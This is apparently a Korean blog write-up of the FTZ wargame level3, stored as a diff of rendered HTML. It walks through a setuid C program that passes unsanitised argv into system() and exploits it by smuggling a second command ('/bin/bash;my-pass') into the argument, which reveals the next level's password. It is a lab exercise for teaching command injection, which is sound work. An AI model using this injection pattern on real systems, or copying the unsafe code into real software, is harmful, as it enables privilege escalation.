@@ -1,0 +1,99 @@
+I"|<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level3 
+level3@~~~~<span class="s1">'s password: 
+[level3@ftz level3]$
+</span></code></pre></div></div>
+
+<p>level3/can you fly?로 접속하자. 빠르게 hint파일을 읽었다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level3@ftz level3]<span class="nv">$ </span><span class="nb">ls 
+</span>hint  public_html  tmp 
+<span class="o">[</span>level3@ftz level3]<span class="nv">$ </span><span class="nb">cat </span>hint
+</code></pre></div></div>
+
+<p>다음 코드는 autodig의 소스이다.</p>
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span> 
+
+    <span class="kt">char</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span> 
+
+    <span class="k">if</span><span class="p">(</span> <span class="n">argc</span><span class="o">!=</span><span class="mi">2</span> <span class="p">){</span> 
+        <span class="n">printf</span><span class="p">(</span> <span class="s">"Auto Digger Version 0.9</span><span class="se">\n</span><span class="s">"</span> <span class="p">);</span> 
+        <span class="n">printf</span><span class="p">(</span> <span class="s">"Usage : %s host</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">);</span> 
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span> 
+    <span class="p">}</span> 
+
+    <span class="n">strcpy</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">"dig @"</span> <span class="p">);</span> 
+    <span class="n">strcat</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span> 
+    <span class="n">strcat</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">" version.bind chaos txt"</span><span class="p">);</span> 
+
+    <span class="n">system</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">);</span> 
+
+<span class="p">}</span> 
+
+<span class="err">이를</span> <span class="err">이용하여</span> <span class="n">level4</span><span class="err">의</span> <span class="err">권한을</span> <span class="err">얻어라</span><span class="p">.</span> 
+
+<span class="n">more</span> <span class="n">hints</span><span class="p">.</span> 
+<span class="o">-</span> <span class="err">동시에</span> <span class="err">여러</span> <span class="err">명령어를</span> <span class="err">사용하려면</span><span class="o">?</span> 
+<span class="o">-</span> <span class="err">문자열</span> <span class="err">형태로</span> <span class="err">명령어를</span> <span class="err">전달하려면</span><span class="o">?</span>
+</code></pre></div></div>
+
+<p>C 프로그램의 소스가 나왔다. 해킹을 하기 위해서는 프로그래밍을 할 줄 알아야 한다는 말이 이렇게 증명된다는 생각이 들었다. 간단하게 주석을 달아보자면.</p>
+
+<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+</span>
+<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">**</span><span class="n">argv</span><span class="p">){</span> 
+
+    <span class="kt">char</span> <span class="n">cmd</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span> 
+
+    <span class="k">if</span><span class="p">(</span> <span class="n">argc</span><span class="o">!=</span><span class="mi">2</span> <span class="p">){</span> <span class="c1">//프로그램을 시작하며 주는 인좌의 갯수가 2가 아니라면 </span>
+        <span class="n">printf</span><span class="p">(</span> <span class="s">"Auto Digger Version 0.9</span><span class="se">\n</span><span class="s">"</span> <span class="p">);</span> 
+        <span class="n">printf</span><span class="p">(</span> <span class="s">"Usage : %s host</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="p">);</span> 
+        <span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="c1">//프로그램 종료 </span>
+    <span class="p">}</span> 
+
+    <span class="n">strcpy</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">"dig @"</span> <span class="p">);</span><span class="c1">//cmd를 dig@로 </span>
+    <span class="n">strcat</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="p">);</span><span class="c1">//cmd 뒤에 두번째 명령어를 덧붙인다. </span>
+    <span class="n">strcat</span><span class="p">(</span> <span class="n">cmd</span><span class="p">,</span> <span class="s">" version.bind chaos txt"</span><span class="p">);</span><span class="c1">//cmd 뒤에 version.bind chaos txt를 덧붙인다. </span>
+
+    <span class="n">system</span><span class="p">(</span> <span class="n">cmd</span> <span class="p">);</span><span class="c1">//cmd가 가진 문자열을 실행시킨다.  </span>
+
+<span class="p">}</span>
+</code></pre></div></div>
+
+<p>이해할 수 있을 때까지 읽어 보자.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level3@ftz level3]<span class="nv">$ </span>find / <span class="nt">-user</span> level4 2&gt; /dev/null 
+/bin/autodig
+</code></pre></div></div>
+
+<p>autodig의 주소를 find명령어로 찾아냈다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level3@ftz level3]<span class="nv">$ </span><span class="nb">cd</span> /bin 
+<span class="o">[</span>level3@ftz bin]<span class="nv">$ </span>./autodig my-pass /bin/bash 
+Auto Digger Version 0.9 
+Usage : ./autodig host
+</code></pre></div></div>
+
+<p>autodig에 인좌를 두개 보낸듯 싶지만, 그렇지 않은거 같다. 프로그램이 그대로 종료된 것을 보니 말이다.</p>
+
+<p>인좌를 두개 보내기 위해서는 “”&lt;–쌍따옴표가 필요하다.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level3@ftz bin]<span class="nv">$ </span>./autodig <span class="s2">"/bin/bash;my-pass"</span>
+
+
+
+Level4 Password is <span class="s2">"suck my brain"</span><span class="nb">.</span> 
+<span class="o">[</span>level3@ftz bin]<span class="err">$</span>
+
+
+
+잠시 기다리니 level4의 정답이 나왔다.  
+
+level4<span class="s1">'s password: "suck my brain"
+</span></code></pre></div></div>
+:ET
